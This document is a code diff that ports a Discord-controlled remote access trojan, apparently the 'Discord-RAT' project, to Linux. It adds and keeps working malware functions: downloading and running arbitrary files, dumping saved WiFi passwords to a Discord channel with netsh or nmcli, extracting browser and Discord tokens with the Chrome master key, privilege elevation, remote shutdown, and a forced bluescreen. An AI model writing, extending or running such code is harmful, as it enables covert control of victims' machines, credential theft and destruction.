@@ -24,21 +24,7 @@ from tkinter import messagebox
 
 import aiofiles
 import aiohttp
-from dotenv import load_dotenv
-
-# Load environment variables from .env file
-load_dotenv()
-
-TOKEN = os.getenv("BOT_TOKEN")
-GUILD_ID = int(os.getenv("GUILD_ID"))
-AUTHORIZED_USERS = [
-    int(uid.strip())
-    for uid in os.getenv("AUTHORIZED_USERS", "").split(",")
-    if uid.strip()
-]
-VOICE_CHANNEL_ID = int(os.getenv("VOICE_CHANNEL_ID"))
 import chardet
-import cv2
 import discord
 import nacl
 import numpy as np
@@ -47,18 +33,41 @@ import pyautogui
 import pyttsx3
 import requests
 import sounddevice as sd
-from comtypes import CLSCTX_ALL
-from Crypto.Cipher import AES
 from discord import Embed
 from discord.ext import commands
 from discord.ext.commands import MissingRequiredArgument
 from discord.ui import Button, View
+from dotenv import load_dotenv
 from PIL import ImageGrab
 from plyer import notification
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from pynput import keyboard, mouse
 from pynput.keyboard import Key, Listener
-from win32crypt import CryptUnprotectData
+
+# ── Platform detection ─────────────────────────────────────────────────────
+IS_WINDOWS = platform.system() == "Windows"
+
+# Windows-only imports
+if IS_WINDOWS:
+    from comtypes import CLSCTX_ALL
+    from Crypto.Cipher import AES
+    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+    from win32crypt import CryptUnprotectData
+else:
+    CryptUnprotectData = None
+    AudioUtilities = None
+    IAudioEndpointVolume = None
+    CLSCTX_ALL = None
+
+# ── Load .env credentials ──────────────────────────────────────────────────
+load_dotenv()
+TOKEN = os.getenv("BOT_TOKEN")
+GUILD_ID = int(os.getenv("GUILD_ID"))
+AUTHORIZED_USERS = [
+    int(uid.strip())
+    for uid in os.getenv("AUTHORIZED_USERS", "").split(",")
+    if uid.strip()
+]
+VOICE_CHANNEL_ID = int(os.getenv("VOICE_CHANNEL_ID"))
 
 admin_status_file = "admin_status.txt"
 
@@ -142,36 +151,38 @@ def load_admin_status():
 
 def check_if_admin():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
+        if IS_WINDOWS:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        else:
+            return os.getuid() == 0
     except:
         return False
 
 
 def elevate():
     try:
-        # Check if admin rights are already present
         if check_if_admin():
             raise Exception("The process already has admin rights.")
 
-        script = os.path.abspath(sys.argv[0])
-        script_ext = os.path.splitext(script)[1].lower()
-
-        if script_ext == ".exe":
-            # If the file is an .exe, run it directly
-            command = f'"{script}"'
-        else:
-            # If the file is a .py, use the Python interpreter
-            command = f'"{sys.executable}" "{script}"'
-
-        # Restart the script as administrator via cmd, run the script, wait 7 seconds and close the window
-        result = ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", "cmd.exe", f"/k {command} & timeout /t 7 & exit", None, 1
-        )
-
-        if result > 32:  # Success
-            return True  # Restart successfully initiated
-        else:
+        if IS_WINDOWS:
+            script = os.path.abspath(sys.argv[0])
+            script_ext = os.path.splitext(script)[1].lower()
+            command = (
+                f'"{script}"'
+                if script_ext == ".exe"
+                else f'"{sys.executable}" "{script}"'
+            )
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", "cmd.exe", f"/k {command} & timeout /t 7 & exit", None, 1
+            )
+            if result > 32:
+                return True
             raise Exception("Error restarting the script with admin rights.")
+        else:
+            # On Linux: re-launch with sudo
+            args = ["sudo", sys.executable] + sys.argv
+            subprocess.Popen(args)
+            return True
     except Exception as e:
         raise Exception(f"Error requesting admin rights: {str(e)}")
 
@@ -545,19 +556,11 @@ async def execute(ctx, url):
                     async with aiofiles.open(temp_filepath, mode="wb") as f:
                         await f.write(await resp.read())
 
-                    # Start the file in the temporary folder
-                    if is_admin:
-                        subprocess.Popen(
-                            temp_filepath,
-                            shell=True,
-                            creationflags=subprocess.CREATE_NEW_CONSOLE,
-                        )
-                    else:
-                        subprocess.Popen(
-                            temp_filepath,
-                            shell=True,
-                            creationflags=subprocess.CREATE_NEW_CONSOLE,
-                        )
+                    # Start the file
+                    kwargs = {"shell": True}
+                    if IS_WINDOWS:
+                        kwargs["creationflags"] = subprocess.CREATE_NEW_CONSOLE
+                    subprocess.Popen(temp_filepath, **kwargs)
 
                     await working_message.delete()
                     await log_message(
@@ -692,10 +695,10 @@ async def restart(ctx):
         return
 
     try:
-        if is_admin:
+        if IS_WINDOWS:
             subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
         else:
-            subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
+            subprocess.run(["reboot"], check=True)
         await log_message(ctx, "The PC is restarting.")
     except Exception as e:
         await log_message(ctx, f"Error restarting the PC: {str(e)}")
@@ -709,10 +712,10 @@ async def shutdown(ctx):
         return
 
     try:
-        if is_admin:
+        if IS_WINDOWS:
             subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
         else:
-            subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
+            subprocess.run(["shutdown", "-h", "now"], check=True)
         await log_message(ctx, "The PC is shutting down.")
     except Exception as e:
         await log_message(ctx, f"Error shutting down the PC: {str(e)}")
@@ -770,33 +773,73 @@ async def wifi(ctx):
         if not os.path.exists(export_dir):
             os.makedirs(export_dir)
 
-        # Export WLAN profiles (incl. keys) without a console window
-        subprocess.run(
-            ["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_dir}"],
-            check=True,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-
-        # Read all exported XML files
-        xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
-        if not xml_files:
+        if IS_WINDOWS:
+            # Export WLAN profiles (incl. keys) without a console window
+            subprocess.run(
+                [
+                    "netsh",
+                    "wlan",
+                    "export",
+                    "profile",
+                    "key=clear",
+                    f"folder={export_dir}",
+                ],
+                check=True,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+            # Read all exported XML files
+            xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
+            if not xml_files:
+                await working_message.delete()
+                await send_temporary_message(
+                    ctx, "No exported WLAN profiles found.", duration=10
+                )
+                return
+            for xml_file in xml_files:
+                with open(xml_file, "rb") as f:
+                    await ctx.send(
+                        file=discord.File(f, filename=os.path.basename(xml_file))
+                    )
             await working_message.delete()
             await send_temporary_message(
-                ctx, "No exported WLAN profiles found.", duration=10
+                ctx, "WLAN profiles successfully exported and sent.", duration=10
             )
-            return
-
-        # Send the XML files to the Discord channel
-        for xml_file in xml_files:
-            with open(xml_file, "rb") as f:
-                await ctx.send(
-                    file=discord.File(f, filename=os.path.basename(xml_file))
+        else:
+            # Linux: use nmcli to dump saved WiFi passwords
+            result = subprocess.run(
+                ["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"],
+                capture_output=True,
+                text=True,
+            )
+            lines = [l for l in result.stdout.strip().splitlines() if "wireless" in l]
+            output = ""
+            for line in lines:
+                name = line.split(":")[0]
+                pw_result = subprocess.run(
+                    [
+                        "nmcli",
+                        "-s",
+                        "-g",
+                        "802-11-wireless-security.psk",
+                        "connection",
+                        "show",
+                        name,
+                    ],
+                    capture_output=True,
+                    text=True,
                 )
-
-        await working_message.delete()
-        await send_temporary_message(
-            ctx, "WLAN profiles successfully exported and sent.", duration=10
-        )
+                password = pw_result.stdout.strip() or "(no password / open)"
+                output += f"SSID: {name} | Password: {password}\n"
+            await working_message.delete()
+            if output:
+                for chunk in [
+                    output[i : i + 1900] for i in range(0, len(output), 1900)
+                ]:
+                    await ctx.send(f"```\n{chunk}\n```")
+            else:
+                await send_temporary_message(
+                    ctx, "No WiFi profiles found.", duration=10
+                )
 
     except Exception as e:
         await working_message.delete()
@@ -1036,24 +1079,30 @@ async def tts_error(ctx, error):
         await log_message(ctx, f"❌ **Error:** {str(error)}", duration=10)
 
 
-# Function to download libopus if it doesn't exist in the temp directory
-def download_libopus():
-    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
-    temp_dir = tempfile.gettempdir()
-    opuslib_path = os.path.join(temp_dir, "libopus.dll")
-
-    if not os.path.exists(opuslib_path):
-        response = requests.get(url)
-        with open(opuslib_path, "wb") as file:
-            file.write(response.content)
-        print(f"{opuslib_path} downloaded.")
-
-    return opuslib_path
-
-
 # Load Opus library
-opuslib_path = download_libopus()
-discord.opus.load_opus(opuslib_path)
+if IS_WINDOWS:
+
+    def download_libopus():
+        url = (
+            "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
+        )
+        opuslib_path = os.path.join(tempfile.gettempdir(), "libopus.dll")
+        if not os.path.exists(opuslib_path):
+            response = requests.get(url)
+            with open(opuslib_path, "wb") as file:
+                file.write(response.content)
+            print(f"{opuslib_path} downloaded.")
+        return opuslib_path
+
+    discord.opus.load_opus(download_libopus())
+else:
+    # On Linux, libopus is installed via the system package manager (libopus0 / libopus-dev).
+    # discord.py finds it automatically; manual loading is not needed.
+    if not discord.opus.is_loaded():
+        try:
+            discord.opus.load_opus("libopus.so.0")
+        except Exception:
+            pass  # discord.py will try on its own
 
 
 # SoundDevice PCM class for streaming audio from the microphone
@@ -1241,8 +1290,11 @@ async def bsod(ctx):
 @commands.check(is_authorized)
 async def confirm_bsod(ctx):
     if confirmation_pending.get(ctx.author.id):
+        if not IS_WINDOWS:
+            await ctx.send("❌ BSOD is only supported on Windows.")
+            confirmation_pending.pop(ctx.author.id, None)
+            return
         await ctx.send("Triggering Bluescreen now... 💀")
-        # Trigger the Bluescreen
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(
             0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
@@ -1321,12 +1373,37 @@ async def input_command(ctx, action: str):
 input_command.error(generic_command_error)
 
 
-# Function to get the default audio device
+def _linux_get_volume():
+    """Return current volume (0-100) via pactl."""
+    r = subprocess.run(
+        ["pactl", "get-sink-volume", "@DEFAULT_SINK@"], capture_output=True, text=True
+    )
+    import re as _re
+
+    m = _re.search(r"(\d+)%", r.stdout)
+    return int(m.group(1)) if m else 0
+
+
+def _linux_is_muted():
+    r = subprocess.run(
+        ["pactl", "get-sink-mute", "@DEFAULT_SINK@"], capture_output=True, text=True
+    )
+    return "yes" in r.stdout.lower()
+
+
+def _linux_set_volume(pct):
+    subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", f"{pct}%"])
+
+
+def _linux_set_mute(mute: bool):
+    subprocess.run(["pactl", "set-sink-mute", "@DEFAULT_SINK@", "1" if mute else "0"])
+
+
+# Windows helper — only called when IS_WINDOWS
 def get_default_audio_device():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = interface.QueryInterface(IAudioEndpointVolume)
-    return volume
+    return interface.QueryInterface(IAudioEndpointVolume)
 
 
 # Command to control volume
@@ -1336,52 +1413,85 @@ async def volume(ctx, *args):
     if not in_correct_channel(ctx):
         await wrong_channel(ctx)
         return
-    volume = get_default_audio_device()
 
-    if not args:
-        current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
-        is_muted = volume.GetMute()
-        mute_status = "Muted 🔇" if is_muted else "Unmuted 🔊"
-
-        await ctx.send(
-            f"🎵 **Audio Device Info:**\n"
-            f"Device Name: Default Device\n"
-            f"Max Volume: 100%\n"
-            f"Current Volume: {current_volume}%\n"
-            f"Status: {mute_status}\n\n"
-            f"**Usage:**\n"
-            f"`!volume` - Show volume information and available commands\n"
-            f"`!volume [0-100]` - Set volume to a specific percentage\n"
-            f"`!volume mute` - Mute the audio\n"
-            f"`!volume unmute` - Unmute the audio"
-        )
-    elif args[0].isdigit():
-        new_volume = int(args[0])
-        if new_volume < 0 or new_volume > 100:
-            msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
-            await msg.delete(delay=10)
-        else:
-            volume.SetMasterVolumeLevelScalar(new_volume / 100.0, None)
+    if IS_WINDOWS:
+        vol = get_default_audio_device()
+        if not args:
+            current_volume = int(vol.GetMasterVolumeLevelScalar() * 100)
+            mute_status = "Muted 🔇" if vol.GetMute() else "Unmuted 🔊"
+        elif args[0].isdigit():
+            new_volume = int(args[0])
+            if not 0 <= new_volume <= 100:
+                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
+                await msg.delete(delay=10)
+                return
+            vol.SetMasterVolumeLevelScalar(new_volume / 100.0, None)
             await ctx.send(f"🔊 **Volume set to {new_volume}%**")
-    elif args[0] == "mute":
-        if volume.GetMute():
-            msg = await ctx.send("❌ **Error:** The device is already muted.")
-            await msg.delete(delay=10)
-        else:
-            volume.SetMute(1, None)
+            return
+        elif args[0] == "mute":
+            if vol.GetMute():
+                msg = await ctx.send("❌ **Error:** Already muted.")
+                await msg.delete(delay=10)
+                return
+            vol.SetMute(1, None)
             await ctx.send("🔇 **Audio has been muted.**")
-    elif args[0] == "unmute":
-        if not volume.GetMute():
-            msg = await ctx.send("❌ **Error:** The device is already unmuted.")
-            await msg.delete(delay=10)
-        else:
-            volume.SetMute(0, None)
+            return
+        elif args[0] == "unmute":
+            if not vol.GetMute():
+                msg = await ctx.send("❌ **Error:** Already unmuted.")
+                await msg.delete(delay=10)
+                return
+            vol.SetMute(0, None)
             await ctx.send("🔊 **Audio has been unmuted.**")
+            return
+        else:
+            msg = await ctx.send("❌ **Error:** Invalid command.")
+            await msg.delete(delay=10)
+            return
     else:
-        msg = await ctx.send(
-            "❌ **Error:** Invalid command. Use `!volume`, `!volume [0-100]`, `!volume mute`, or `!volume unmute`."
-        )
-        await msg.delete(delay=10)
+        # Linux via pactl
+        if not args:
+            current_volume = _linux_get_volume()
+            mute_status = "Muted 🔇" if _linux_is_muted() else "Unmuted 🔊"
+        elif args[0].isdigit():
+            new_volume = int(args[0])
+            if not 0 <= new_volume <= 100:
+                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
+                await msg.delete(delay=10)
+                return
+            _linux_set_volume(new_volume)
+            await ctx.send(f"🔊 **Volume set to {new_volume}%**")
+            return
+        elif args[0] == "mute":
+            if _linux_is_muted():
+                msg = await ctx.send("❌ **Error:** Already muted.")
+                await msg.delete(delay=10)
+                return
+            _linux_set_mute(True)
+            await ctx.send("🔇 **Audio has been muted.**")
+            return
+        elif args[0] == "unmute":
+            if not _linux_is_muted():
+                msg = await ctx.send("❌ **Error:** Already unmuted.")
+                await msg.delete(delay=10)
+                return
+            _linux_set_mute(False)
+            await ctx.send("🔊 **Audio has been unmuted.**")
+            return
+        else:
+            msg = await ctx.send("❌ **Error:** Invalid command.")
+            await msg.delete(delay=10)
+            return
+
+    # No-args info message (both platforms reach here)
+    await ctx.send(
+        f"🎵 **Audio Device Info:**\n"
+        f"Current Volume: {current_volume}%\n"
+        f"Status: {mute_status}\n\n"
+        f"**Usage:**\n"
+        f"`!volume [0-100]` - Set volume\n"
+        f"`!volume mute` / `!volume unmute` - Toggle mute"
+    )
 
 
 # Variable to store the black screen window
@@ -1623,6 +1733,8 @@ class extract_tokens:
         return decrypted_pass
 
     def get_master_key(self, path: str) -> str:
+        if not IS_WINDOWS:
+            return None
         if not os.path.exists(path):
             return
         if "os_crypt" not in open(path, "r", encoding="utf-8").read():
@@ -1630,7 +1742,6 @@ class extract_tokens:
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
-
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
@@ -1774,14 +1885,15 @@ async def grab_tokens(ctx):
         await wrong_channel(ctx)
         return
 
-    loading_message = await ctx.send(
-        "🔄 Extracting Discord tokens..."
-    )  # Send loading message
+    if not IS_WINDOWS:
+        await log_message(
+            ctx, "❌ Token grabbing is only supported on Windows.", duration=10
+        )
+        return
+    loading_message = await ctx.send("🔄 Extracting Discord tokens...")
     try:
-        raw_data = False  # Set to True if you want raw data instead of embeds
-        asyncio.create_task(
-            long_running_task(ctx, raw_data)
-        )  # Run the long-running task in the background
+        raw_data = False
+        asyncio.create_task(long_running_task(ctx, raw_data))
     except Exception as e:
         await log_message(ctx, f"Error whilst extracting tokens: {str(e)}", duration=10)
 
